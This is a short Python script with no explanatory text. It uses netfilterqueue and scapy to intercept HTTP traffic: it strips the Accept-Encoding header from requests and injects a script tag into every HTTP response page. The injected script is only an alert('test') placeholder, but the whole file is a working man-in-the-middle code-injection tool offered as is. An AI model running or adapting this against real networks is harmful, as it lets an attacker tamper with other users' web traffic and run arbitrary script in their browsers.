import netfilterqueue
import scapy.all as scapy
import re
 
 
def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet
 
 
def process_packets(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            print("[+] REQUEST")
            modified_load = re.sub("Accept-Encoding:.*?\\r\\n", "", scapy_packet[scapy.Raw].load)
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
        elif scapy_packet[scapy.TCP].sport == 80:
            print("[+]RESPONSE")
            modified_load = scapy_packet[scapy.Raw].load.replace("</body>","<script>alert('test');</script></body>")
            new_packet = set_load(scapy_packet, modified_load)
            packet.set_payload(str(new_packet))
    packet.accept()
 
 
queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packets)
try:
    queue.run()
 
except KeyboardInterrupt:
    print(" detected Ctrl+C, shutting down")
